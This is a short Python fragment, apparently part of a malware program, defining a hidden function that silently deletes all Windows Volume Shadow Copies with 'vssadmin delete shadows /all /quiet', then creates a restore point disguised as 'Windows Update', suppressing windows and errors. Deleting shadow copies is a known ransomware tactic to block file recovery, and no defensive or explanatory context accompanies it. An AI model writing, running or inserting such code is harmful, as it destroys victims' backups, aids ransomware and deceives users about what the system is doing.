import os
import subprocess
import threading
import time
def noez():
    try:
        subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 
                        'Checkpoint-Computer -Description "Windows Update" -RestorePointType "MODIFY_SETTINGS"'],
                       creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass